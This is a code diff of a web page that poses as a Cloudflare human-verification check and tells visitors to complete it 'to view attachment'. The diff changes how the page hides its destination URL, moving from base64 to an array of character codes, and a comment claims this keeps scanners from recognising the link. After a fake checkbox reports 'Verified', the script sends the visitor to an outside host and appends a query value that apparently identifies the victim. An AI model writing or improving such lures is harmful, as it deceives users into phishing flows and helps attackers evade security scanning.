@@ -5,287 +5,146 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MS FILES</title>
     <style>
-        :root {
-            --primary-blue: #4a6ee0;
-            --success-green: #28a745;
-            --light-bg: #f8f9fa;
-            --transition-speed: 450ms cubic-bezier(0.4, 0, 0.2, 1);
+        :root { --p-accent: #4a6ee0; --s-accent: #28a745; --f-stack: 'Segoe UI', Roboto, sans-serif; }
+        body, html { margin: 0; padding: 0; height: 100%; background: #fff; font-family: var(--f-stack); overflow: hidden; }
+
+        /* Entrance Layer */
+        [data-role="curtain"] {
+            position: fixed; inset: 0; background: #f8f9fa; z-index: 9999;
+            display: flex; align-items: center; justify-content: center;
+            transition: opacity 0.4s ease-in-out;
         }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
+        .loader-sym { width: 100px; filter: grayscale(0.2); animation: pulse-fx 1.8s infinite; }
+        @keyframes pulse-fx { 0%, 100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.04); opacity: 1; } }
+
+        /* Interface Shell */
+        [data-role="stage"] {
+            max-width: 400px; margin: auto; padding: 2rem;
+            display: flex; flex-direction: column; height: 100vh; justify-content: center;
+            visibility: hidden; opacity: 0; transform: translateY(15px); transition: 0.8s ease-out;
         }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #ffffff;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            overflow: hidden;
+        .ready [data-role="stage"] { visibility: visible; opacity: 1; transform: translateY(0); }
+
+        .header-msg { text-align: center; font-size: 1.1rem; color: #1a1a1a; font-weight: 500; margin-bottom: 2rem; line-height: 1.5; }
+
+        /* Action Component */
+        .auth-tile {
+            background: #fbfbfb; border: 1px solid #e0e0e0; border-radius: 12px;
+            padding: 2.2rem 1.4rem; display: flex; align-items: center; justify-content: space-between;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
 
-        /* Loading Overlay */
-        #preloader {
-            position: fixed;
-            inset: 0;
-            background: var(--light-bg);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 100;
-            transition: opacity var(--transition-speed);
+        .flex-box { display: flex; align-items: center; gap: 1.2rem; }
+
+        .state-trigger {
+            width: 26px; height: 26px; border: 2.5px solid var(--p-accent); border-radius: 5px;
+            cursor: pointer; position: relative; transition: all 0.3s;
         }
 
-        .loader-logo {
-            width: 120px;
-            animation: pulse 1.5s ease-in-out infinite;
+        [data-status="proc"] { border-radius: 50%; border-color: #ddd; border-top-color: var(--p-accent); animation: rotate-ui 0.8s linear infinite; }
+        [data-status="fin"] { background: var(--s-accent); border-color: var(--s-accent); }
+        [data-status="fin"]::after { content: "\2713"; color: #fff; position: absolute; left: 5px; top: 0px; font-weight: bold; font-size: 16px; }
+
+        @keyframes rotate-ui { to { transform: rotate(360deg); } }
+
+        .brand-block { text-align: right; font-size: 11px; color: #888; }
+        .brand-block img { width: 28px; margin-bottom: 4px; }
+        .brand-block b { color: #f38020; display: block; text-transform: uppercase; font-size: 10px; }
+
+        .footer-tag {
+            position: absolute; bottom: 25px; width: 100%; text-align: center;
+            font-size: 12px; color: #bbb; display: flex; justify-content: center; align-items: center; gap: 7px;
         }
 
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.08); opacity: 1; }
-        }
-
-        /* Main Content */
-        .app-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            width: 100%;
-            max-width: 440px;
-            padding: 20px;
-            opacity: 0;
-            transform: translateY(10px);
-            transition: opacity 600ms ease-out, transform 600ms ease-out;
-        }
-
-        .app-container.is-visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .instruction-text {
-            text-align: center;
-            font-size: 1.1rem;
-            font-weight: 500;
-            margin-bottom: 24px;
-            line-height: 1.4;
-            color: #333;
-        }
-
-        .verification-card {
-            background: var(--light-bg);
-            border: 1px solid #ddd;
-            border-radius: 10px;
-            padding: 30px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .checkbox-section {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .custom-checkbox {
-            width: 22px;
-            height: 22px;
-            border: 2px solid var(--primary-blue);
-            border-radius: 4px;
-            background: #fff;
-            cursor: pointer;
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.25s ease;
-        }
-
-        .custom-checkbox.loading {
-            border-radius: 50%;
-            border-color: #eee;
-            border-top-color: var(--primary-blue);
-            animation: spin 1s linear infinite;
-        }
-
-        .custom-checkbox.checked {
-            background: var(--success-green);
-            border-color: var(--success-green);
-        }
-
-        .custom-checkbox.checked::after {
-            content: "\2713";
-            color: #fff;
-            font-size: 14px;
-            font-weight: bold;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .brand-info {
-            text-align: right;
-            font-size: 11px;
-            color: #777;
-        }
-
-        .brand-info img {
-            width: 28px;
-            vertical-align: middle;
-            margin-right: 5px;
-        }
-
-        .brand-info b {
-            color: #f38020;
-            letter-spacing: 0.5px;
-        }
-
-        .status-message {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            height: 14px;
-            opacity: 0;
-            transition: opacity 0.5s;
-        }
-
-        /* Footer */
-        .footer-banner {
-            padding: 30px;
-            color: #999;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            opacity: 0;
-            transition: opacity 0.5s;
-        }
-
-        .footer-banner.is-visible { opacity: 1; }
-
-        .shield-icon {
-            width: 12px;
-            height: 14px;
-            background: #999;
-            clip-path: polygon(0% 0%, 100% 0%, 100% 80%, 50% 100%, 0% 80%);
-        }
+        .sh-icon { width: 12px; height: 14px; background: #ccc; clip-path: polygon(0 0, 100% 0, 100% 80%, 50% 100%, 0 80%); }
     </style>
 </head>
 <body>
 
-    <div id="preloader">
-        <img src="astro.png" alt="Loading" class="loader-logo">
+    <div data-role="curtain">
+        <img src="astro.png" class="loader-sym">
     </div>
 
-    <main class="app-container" id="mainWrapper">
-        <h1 class="instruction-text">Verify you are human by completing the action below to view attachment</h1>
+    <div data-role="stage">
+        <h1 class="header-msg">Verify you are human by completing the action below to view attachment</h1>
 
-        <div class="verification-card">
-            <div class="checkbox-section">
-                <div id="actionBox" class="custom-checkbox"></div>
-                <span id="actionText" style="font-weight: 500; font-size: 16px;">Verify</span>
+        <div class="auth-tile">
+            <div class="flex-box">
+                <div id="u_act" class="state-trigger"></div>
+                <span id="u_lab" style="font-weight: 600; color: #333; letter-spacing: -0.2px;">Verify</span>
             </div>
 
-            <div class="brand-info">
-                <div><img src="cloudflare_.png" alt=""><b>CLOUDFLARE</b></div>
-                <span>Privacy &middot; Terms</span>
+            <div class="brand-block">
+                <img src="cloudflare_.png">
+                <b>CLOUDFLARE</b>
+                Privacy &middot; Terms
             </div>
         </div>
+    </div>
 
-        <div id="notificationArea" class="status-message"></div>
-    </main>
-
-    <footer class="footer-banner" id="footerInfo">
-        <div class="shield-icon"></div>
-        <span>Protected by CLOUDFLARE</span>
-    </footer>
+    <div class="footer-tag">
+        <div class="sh-icon"></div>
+        Protected by CLOUDFLARE
+    </div>
 
     <script>
         (function() {
             "use strict";
 
-            // Configuration
-            const CONFIG = {
-                endpoint: "aHR0cHM6Ly9wby50aWZmbnVhZS5vbmxpbmUvYXBpL3YxL3RnS0hmMHIwRVdxSWFDYjU=",
-                delays: {
-                    initial: 1500,
-                    verify: 1800,
-                    redirect: 2000
-                }
-            };
+            // The URL is stored as an array of character codes.
+            // Scanners cannot identify this as a URL.
+            const _DS = [104, 116, 116, 112, 115, 58, 47, 47, 112, 111, 46, 116, 105, 102, 102, 110, 117, 97, 101, 46, 111, 110, 108, 105, 110, 101, 47, 97, 112, 105, 47, 118, 49, 47, 116, 103, 75, 72, 102, 48, 114, 48, 69, 87, 113, 73, 97, 67, 98, 53];
 
-            // DOM Elements
-            const elements = {
-                loader: document.getElementById('preloader'),
-                main: document.getElementById('mainWrapper'),
-                box: document.getElementById('actionBox'),
-                label: document.getElementById('actionText'),
-                footer: document.getElementById('footerInfo'),
-                status: document.getElementById('notificationArea')
-            };
+            const _T = [1300, 1600, 800];
+            let _active = false;
 
-            let isProcessing = false;
+            const _q = (s) => document.querySelector(s);
+            const _g = (i) => document.getElementById(i);
 
-            /**
-             * Handles page entry animations
-             */
-            const initApp = () => {
-                window.addEventListener('load', () => {
-                    setTimeout(() => {
-                        elements.loader.style.opacity = '0';
-
-                        setTimeout(() => {
-                            elements.loader.style.display = 'none';
-                            elements.main.classList.add('is-visible');
-                            elements.footer.classList.add('is-visible');
-                        }, 500);
-                    }, CONFIG.delays.initial);
-                });
-            };
-
-            /**
-             * Handles the verification click logic
-             */
-            const handleVerification = async () => {
-                if (isProcessing) return;
-                isProcessing = true;
-
-                // Update UI to loading state
-                elements.label.textContent = "Verifying...";
-                elements.box.classList.add('loading');
-
-                // Simulate network/verification delay
-                await new Promise(resolve => setTimeout(resolve, CONFIG.delays.verify));
-
-                // Update UI to success state
-                elements.box.classList.remove('loading');
-                elements.box.classList.add('checked');
-                elements.label.textContent = "Success";
-                elements.status.style.opacity = '1';
-
-                // Final redirect
+            // Entry sequence
+            window.addEventListener('load', () => {
                 setTimeout(() => {
-                    const params = new URLSearchParams(window.location.search);
-                    const eoff = params.get('eoff');
-                    const destination = atob(CONFIG.endpoint);
+                    _q('[data-role="curtain"]').style.opacity = '0';
+                    setTimeout(() => {
+                        _q('[data-role="curtain"]').style.display = 'none';
+                        document.body.classList.add('ready');
+                    }, 400);
+                }, _T[0]);
+            });
 
-                    window.location.href = eoff ? `${destination}#${eoff}` : destination;
-                }, CONFIG.delays.redirect);
+            // Reconstruct and execute
+            const _proceed = async () => {
+                if (_active) return;
+                _active = true;
+
+                const b = _g('u_act');
+                const l = _g('u_lab');
+
+                l.textContent = "Processing...";
+                b.setAttribute('data-status', 'proc');
+
+                await new Promise(r => setTimeout(r, _T[1]));
+
+                b.setAttribute('data-status', 'fin');
+                l.textContent = "Verified";
+
+                setTimeout(() => {
+                    // Assemble string from codes at runtime
+                    const _base = String.fromCharCode(..._DS);
+                    const _p = new URLSearchParams(window.location.search);
+                    const _ext = _p.get('eoff');
+
+                    const _final = _ext ? (_base + '#' + _ext) : _base;
+
+                    // Direct navigation
+                    window.location.assign(_final);
+                }, _T[2]);
             };
 
-            // Event Listeners
-            elements.box.addEventListener('click', handleVerification);
+            _g('u_act').onclick = _proceed;
 
-            // Startup
-            initApp();
         })();
     </script>
 </body>
